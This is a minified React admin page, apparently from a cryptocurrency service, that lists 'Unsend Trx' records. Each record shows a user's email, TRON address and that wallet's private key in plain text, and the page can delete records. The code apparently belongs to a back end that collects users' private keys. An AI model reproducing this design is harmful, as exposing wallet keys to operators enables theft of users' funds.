import{A as w,u as g,r as n,j as e,B as m,I as a,b as h,_ as l}from"./index--FpPv6_1.js";import{h as v}from"./moment-C5S46NFB.js";const k=()=>{const p=g(),b=()=>p("/"),[u,c]=n.useState([]),o=localStorage.getItem("token"),[d,i]=n.useState("");n.useEffect(()=>{(async()=>{try{const r=await h.get("/api/unsendtrx/admin-api/unsend-data-get/unsend-trx",{headers:{Authorization:`Bearer ${o}`}});c(r.data.data)}catch(r){console.error("Failed to fetch history data",r),r.response?l.error(r.response.data.message||"Failed to update OTP check setting"):r.request?l.error("No response received from server"):l.error(`Error: ${r.message}`)}})()},[]);const j=async s=>{try{await h.delete(`/api/unsendtrx/admin-api/unsend-data-delete/unsend-trx?id=${s}`,{headers:{Authorization:`Bearer ${o}`}}),c(r=>r.filter(y=>y._id!==s))}catch(r){console.error("Failed to delete:",r)}},f=s=>{i(s.target.value)},N=()=>{i("")},x=u.filter(s=>s.email.toLowerCase().includes(d.toLowerCase())),t={wordBreak:"break-word",whiteSpace:"normal",overflowWrap:"break-word"};return e.jsxs(e.Fragment,{children:[e.jsx("div",{className:"w-full my-4 flex items-center justify-between",children:e.jsxs(m,{variant:"link",onClick:b,className:"text-sm font-normal text-[#8C8C8C] !no-underline p-1 h-0 flex gap-2",children:[e.jsx(a.arrowLeft,{className:"w-4 h-4"}),"Unsend Trx"]})}),e.jsx("div",{className:"flex items-center justify-center pt-[1rem]",children:e.jsxs("div",{className:"bg-transparent w-full max-w-md rounded-lg mb-[60px] border-none dark",children:[e.jsxs("div",{className:"w-full flex bg-[#18191c] rounded-2xl px-2 items-center justify-center h-[50px] mb-3",children:[e.jsx(a.search,{className:"w-4 h-4 text-primary"}),e.jsx("input",{type:"text",placeholder:"Search by email...",value:d,onChange:f,className:"w-[85%] h-[50px] ml-2 text-sm bg-transparent border-0 text-white placeholder:text-primary focus:outline-none"}),d!==""?e.jsx(a.circleX,{className:"text-primary cursor-pointer",onClick:N}):""]}),x.length>0?x.map((s,r)=>e.jsx("div",{className:"mt-[1.5rem] w-full border-[10px] border-[#444444] rounded-lg",children:e.jsx("table",{className:"w-full table-auto",children:e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"border-b-2 border-[#949494] p-3 px-5 text-[#959595]",children:"SL No"}),e.jsx("td",{className:"border-b-2 border-[#949494] p-3",style:t,children:r+1})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"border-b-2 border-[#949494] p-3 px-5 text-[#959595]",children:"Email"}),e.jsx("td",{className:"border-b-2 border-[#949494] p-3",style:t,children:s.email})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"border-b-2 border-[#949494] p-3 px-5 text-[#959595]",children:"Trx Address"}),e.jsx("td",{className:"border-b-2 border-[#949494] p-3",style:t,children:s.trxAddress})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"border-b-2 border-[#949494] p-3 px-5 text-[#959595]",children:"Private Key"}),e.jsx("td",{className:"border-b-2 border-[#949494] p-3",style:t,children:s.trxPrivateKey})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"border-b-2 border-[#949494] p-3 px-5 text-[#959595]",children:"Date & Time"}),e.jsx("td",{className:"border-b-2 border-[#949494] p-3",style:t,children:v(s.createdAt).format("DD/MM/YYYY hh:mm:ss A")})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-3 px-5 text-[#959595]",children:"Action"}),e.jsx("td",{className:"p-3",children:e.jsx(m,{onClick:()=>j(s._id),children:e.jsx(a.trash,{className:"w-4 h-4 text-red-600"})})})]})]})})},r)):e.jsx("div",{className:"text-white text-center h-full flex items-center justify-center",children:"No data available"})]})})]})},T=w()(k);export{T as default};
